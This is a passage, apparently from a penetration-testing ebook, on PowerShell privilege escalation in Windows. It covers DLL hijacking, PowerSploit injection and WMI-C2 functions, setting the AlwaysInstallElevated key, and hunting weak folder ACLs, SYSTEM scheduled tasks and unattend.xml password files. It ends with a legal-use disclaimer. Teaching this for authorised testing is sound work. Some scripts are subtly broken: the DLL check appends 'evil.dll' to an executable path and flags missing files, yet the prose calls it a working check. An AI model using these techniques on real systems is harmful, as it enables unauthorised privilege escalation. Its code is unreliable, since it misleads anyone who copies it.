}</span></pre> <p><span class="koboSpan" id="kobo.233.1">This script checks the permissions</span><a id="_idIndexMarker989"/><span class="koboSpan" id="kobo.234.1"> of services in the registry and alerts if any have weak permissions that could </span><span class="No-Break"><span class="koboSpan" id="kobo.235.1">be exploited.</span></span></p>
<h2 id="_idParaDest-507"><a id="_idTextAnchor505"/><span class="koboSpan" id="kobo.236.1">DLL hijacking</span></h2>
<p><span class="koboSpan" id="kobo.237.1">DLL hijacking involves replacing</span><a id="_idIndexMarker990"/><span class="koboSpan" id="kobo.238.1"> a legitimate DLL with a malicious one, which can lead to privilege escalation when a process loads that DLL. </span><span class="koboSpan" id="kobo.238.2">PowerShell can be used to identify potential DLL </span><span class="No-Break"><span class="koboSpan" id="kobo.239.1">hijacking opportunities:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.240.1">
# Identify processes with DLL hijacking potential
Get-Process | ForEach-Object {
    $process = $_
    $dllPath = Join-Path $process.MainModule.FileName -ChildPath "evil.dll"
    if (-not (Test-Path $dllPath)) {
        # Exploit DLL hijacking (replace with your payload)
        Write-Host "Potential DLL hijacking found in $($process.ProcessName). </span><span class="koboSpan" id="kobo.240.2">Exploiting..."
</span><span class="koboSpan" id="kobo.240.3">    }
}</span></pre> <p><span class="koboSpan" id="kobo.241.1">This script checks each running process for potential DLL hijacking opportunities and alerts if any are found. </span><span class="koboSpan" id="kobo.241.2">We can also use the </span><strong class="source-inline"><span class="koboSpan" id="kobo.242.1">PowerSploit</span></strong><span class="koboSpan" id="kobo.243.1"> module for </span><span class="No-Break"><span class="koboSpan" id="kobo.244.1">code execution:</span></span></p>
<ul>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.245.1">Invoke-DllInjection</span></strong><span class="koboSpan" id="kobo.246.1">: Injects a DLL into the process ID of </span><span class="No-Break"><span class="koboSpan" id="kobo.247.1">your choosing</span></span></li>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.248.1">Invoke-ReflectivePEInjection</span></strong><span class="koboSpan" id="kobo.249.1">: Reflectively loads a Windows PE file (DLL/EXE) into the PowerShell process or reflectively injects a DLL into a </span><span class="No-Break"><span class="koboSpan" id="kobo.250.1">remote process</span></span></li>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.251.1">Invoke-Shellcode</span></strong><span class="koboSpan" id="kobo.252.1">: Injects shellcode into the process ID of your choosing or within </span><span class="No-Break"><span class="koboSpan" id="kobo.253.1">PowerShell locally</span></span></li>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.254.1">Invoke-WmiCommand</span></strong><span class="koboSpan" id="kobo.255.1">: Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a </span><span class="No-Break"><span class="koboSpan" id="kobo.256.1">C2 channel</span></span></li>
</ul>
<h2 id="_idParaDest-508"><a id="_idTextAnchor506"/><span class="koboSpan" id="kobo.257.1">Registry manipulation</span></h2>
<p><span class="koboSpan" id="kobo.258.1">PowerShell can be used </span><a id="_idIndexMarker991"/><span class="koboSpan" id="kobo.259.1">to manipulate registry settings related to user privileges. </span><span class="koboSpan" id="kobo.259.2">For example, modifying the </span><strong class="source-inline"><span class="koboSpan" id="kobo.260.1">AlwaysInstallElevated</span></strong><span class="koboSpan" id="kobo.261.1"> registry key can lead to </span><span class="No-Break"><span class="koboSpan" id="kobo.262.1">privilege escalation:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.263.1">
# Modify the AlwaysInstallElevated registry key
$regPath = "HKCU:\Software\Policies\Microsoft\Windows\Installer"
$regName = "AlwaysInstallElevated"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name $regName -Value 1</span></pre> <p><span class="koboSpan" id="kobo.264.1">This script creates the necessary registry path and sets the </span><strong class="source-inline"><span class="koboSpan" id="kobo.265.1">AlwaysInstallElevated</span></strong><span class="koboSpan" id="kobo.266.1"> key to </span><strong class="source-inline"><span class="koboSpan" id="kobo.267.1">1</span></strong><span class="koboSpan" id="kobo.268.1">, which can lead to the installation of packages with </span><span class="No-Break"><span class="koboSpan" id="kobo.269.1">elevated privileges.</span></span></p>
<h2 id="_idParaDest-509"><a id="_idTextAnchor507"/><span class="koboSpan" id="kobo.270.1">Exploiting weak folder permissions</span></h2>
<p><span class="koboSpan" id="kobo.271.1">Weak folder permissions</span><a id="_idIndexMarker992"/><span class="koboSpan" id="kobo.272.1"> can be exploited for privilege escalation. </span><span class="koboSpan" id="kobo.272.2">PowerShell can be used to identify folders with </span><span class="No-Break"><span class="koboSpan" id="kobo.273.1">insecure permissions:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.274.1">
# Identify folders with weak permissions
Get-ChildItem -Path C:\ -Recurse | Where-Object {
    $_.PSIsContainer -and (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -eq "Users" -and $_.FileSystemRights -match "Modify" }
}</span></pre> <p><span class="koboSpan" id="kobo.275.1">This script searches for folders with weak permissions (modify rights for </span><strong class="source-inline"><span class="koboSpan" id="kobo.276.1">Users</span></strong><span class="koboSpan" id="kobo.277.1">) and alerts if any </span><span class="No-Break"><span class="koboSpan" id="kobo.278.1">are found.</span></span></p>
<h2 id="_idParaDest-510"><a id="_idTextAnchor508"/><span class="koboSpan" id="kobo.279.1">Scheduled task exploitation</span></h2>
<p><span class="koboSpan" id="kobo.280.1">Windows scheduled tasks</span><a id="_idIndexMarker993"/><span class="koboSpan" id="kobo.281.1"> can be manipulated for privilege escalation. </span><span class="koboSpan" id="kobo.281.2">PowerShell can be used to identify and modify </span><span class="No-Break"><span class="koboSpan" id="kobo.282.1">scheduled tasks:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.283.1">
# Identify scheduled tasks
Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "NT AUTHORITY\SYSTEM" } | ForEach-Object {
    # Exploit scheduled task (replace with your payload)
    Write-Host "Scheduled task $($_.TaskName) is running as SYSTEM. </span><span class="koboSpan" id="kobo.283.2">Exploiting..."
</span><span class="koboSpan" id="kobo.283.3">}</span></pre> <p><span class="koboSpan" id="kobo.284.1">This script identifies scheduled tasks running as </span><strong class="source-inline"><span class="koboSpan" id="kobo.285.1">SYSTEM</span></strong><span class="koboSpan" id="kobo.286.1"> and alerts if any are found, providing an opportunity for </span><span class="No-Break"><span class="koboSpan" id="kobo.287.1">privilege escalation.</span></span></p>
<h2 id="_idParaDest-511"><a id="_idTextAnchor509"/><span class="koboSpan" id="kobo.288.1">Exploiting unattended installations</span></h2>
<p><span class="koboSpan" id="kobo.289.1">Unattended installations may contain sensitive</span><a id="_idIndexMarker994"/><span class="koboSpan" id="kobo.290.1"> information such as passwords in unencrypted files. </span><span class="koboSpan" id="kobo.290.2">PowerShell can be used to search for </span><span class="No-Break"><span class="koboSpan" id="kobo.291.1">such files:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.292.1">
# Search for unattended installation files
Get-ChildItem -Path C:\ -Recurse -Filter "unattend.xml" -File | ForEach-Object {
    # Exploit unattended installation file (replace with your payload)
    Write-Host "Unattended installation file found at $($_.FullName). </span><span class="koboSpan" id="kobo.292.2">Exploiting..."
</span><span class="koboSpan" id="kobo.292.3">}</span></pre> <p><span class="koboSpan" id="kobo.293.1">This script searches for </span><strong class="source-inline"><span class="koboSpan" id="kobo.294.1">unattend.xml</span></strong><span class="koboSpan" id="kobo.295.1"> files recursively and alerts if any potentially containing sensitive information </span><span class="No-Break"><span class="koboSpan" id="kobo.296.1">are found.</span></span></p>
<p><span class="koboSpan" id="kobo.297.1">These examples showcase how PowerShell can be employed for privilege escalation on Microsoft Windows systems. </span><span class="koboSpan" id="kobo.297.2">However, it’s essential to note that these techniques should only be used in ethical hacking</span><a id="_idIndexMarker995"/><span class="koboSpan" id="kobo.298.1"> or penetration testing scenarios within legal and authorized environments. </span><span class="koboSpan" id="kobo.298.2">Unauthorized privilege escalation attempts are illegal and can have severe consequences. </span><span class="koboSpan" id="kobo.298.3">Security professionals and administrators should actively monitor and secure systems to prevent vulnerabilities and </span><span class="No-Break"><span class="koboSpan" id="kobo.299.1">unauthorized access.</span></span></p>
<h1 id="_idParaDest-512"><a id="_idTextAnchor510"/><span class="koboSpan" id="kobo.300.1">Summary</span></h1>
<p><span class="koboSpan" id="kobo.301.1">In this chapter, we explored the dynamic landscape of post-exploitation using PowerShell in Microsoft Windows. </span><span class="koboSpan" id="kobo.301.2">Emphasizing the significance of this phase in security assessments, we navigated through privilege escalation, lateral movement, and data exfiltration techniques, all powered by the versatility of PowerShell scripting. </span><span class="koboSpan" id="kobo.301.3">From uncovering weak permissions and exploiting service configurations to manipulating the registry and covering tracks, PowerShell emerged as a central tool for ethical hackers and defenders. </span><span class="koboSpan" id="kobo.301.4">The chapter provided a comprehensive overview of how PowerShell facilitates sophisticated post-exploitation maneuvers, enabling users to simulate and understand real-world threats. </span><span class="koboSpan" id="kobo.301.5">By employing detailed examples, the chapter equipped readers with the skills to assess and fortify Windows security, ensuring a holistic understanding of post-exploitation dynamics and the role of PowerShell in navigating and securing complex </span><span class="No-Break"><span class="koboSpan" id="kobo.302.1">Windows environments.</span></span></p>
<p><span class="koboSpan" id="kobo.303.1">In the next chapter, we will explore the potent synergy between PowerShell and Linux in the realm </span><span class="No-Break"><span class="koboSpan" id="kobo.304.1">of post-exploitation.</span></span></p>
</div>
</body></html>